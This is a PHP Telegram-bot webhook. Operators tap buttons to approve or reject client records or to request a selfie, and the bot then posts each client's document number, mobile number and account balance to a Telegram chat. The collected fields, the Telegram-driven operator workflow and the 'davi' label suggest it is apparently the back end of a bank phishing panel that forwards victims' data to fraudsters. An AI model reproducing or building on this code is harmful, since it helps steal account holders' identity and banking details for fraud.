<?php
http_response_code(200); // Responder OK a Telegram inmediatamente
include __DIR__ . '/../../db.php';
$config = include __DIR__ . '/../../config.php';

$content = file_get_contents('php://input');
$update = json_decode($content, true);

if (!isset($update['callback_query'])) {
    exit();
}

$callback = $update['callback_query'];
$data = $callback['data'] ?? '';
$parts = explode(':', $data);

if (count($parts) < 2) exit();

$accion = $parts[0];
$clienteId = intval($parts[1]);
$messageId = $callback['message']['message_id'] ?? null;

$estadoMap = [
    'aprobar'  => 'aprobado',
    'rechazar' => 'rechazado',
    'revision' => 'en_revision',
    'selfie'   => 'pedir_selfie'
];

$nuevoEstado = $estadoMap[$accion] ?? null;
if (!$nuevoEstado) exit();

try {
    // Actualizar estado en DB
    $stmt = $conn->prepare("UPDATE clientes SET estado = :estado WHERE id = :id");
    $stmt->execute(['estado' => $nuevoEstado, 'id' => $clienteId]);

    $botToken = $config['botToken'];
    $chatId = $config['chatId'];

    // Consultar datos del cliente
    $stmt2 = $conn->prepare("SELECT * FROM clientes WHERE id = :id");
    $stmt2->execute(['id' => $clienteId]);
    $c = $stmt2->fetch(PDO::FETCH_ASSOC);

    $emojis = [
        'aprobado'     => '✅ Aprobado',
        'rechazado'    => '❌ Rechazado',
        'en_revision'  => '⏳ En revisión',
        'pedir_selfie' => '📸 Solicitando Selfie'
    ];
    $label = $emojis[$nuevoEstado] ?? $nuevoEstado;

    $from = $callback['from'] ?? [];
    $operador = !empty($from['username']) ? '@' . $from['username'] : trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''));
    if (empty($operador)) $operador = 'Operador';

    if ($c && $messageId) {
        $texto = "🔔 *Registro #{$clienteId}* — *{$label}*\n\n"
               . "📋 *Tipo doc:* {$c['tipo_documento']}\n"
               . "🪪 *Documento:* {$c['num_documento']}\n"
               . "📱 *Celular:* {$c['num_celular']}\n"
               . "💰 *Saldo:* {$c['saldo_cuenta']}\n"
               . "📊 *Estado:* {$label}\n"
               . "👤 *Operador:* {$operador}";

        $postData = [
            'chat_id' => $chatId,
            'message_id' => $messageId,
            'text' => $texto,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($ch);
        curl_close($ch);
    }

    // Responder callback
    $ch2 = curl_init("https://api.telegram.org/bot{$botToken}/answerCallbackQuery");
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, json_encode([
        'callback_query_id' => $callback['id'],
        'text' => "Estado actualizado a: {$nuevoEstado}"
    ]));
    curl_setopt($ch2, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_exec($ch2);
    curl_close($ch2);

} catch (Exception $e) {
    error_log("Error webhook davi: " . $e->getMessage());
}
?>
